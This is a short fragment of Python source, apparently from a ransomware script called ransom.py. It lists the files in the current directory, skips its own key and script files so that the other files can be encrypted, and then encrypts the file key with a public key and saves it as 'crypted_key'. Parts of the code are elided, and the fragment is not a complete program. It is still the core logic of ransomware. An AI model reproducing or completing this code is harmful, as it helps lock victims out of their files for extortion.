...
for file in os.listdir():
    if file == "ransom.py" or file == "thekey.key" or file == "ransom_pubkey.txt" or file == "crypted_key":
        continue
...
encryptAndWriteToFile('crypted_key','ransom_pubkey.txt',str(key))
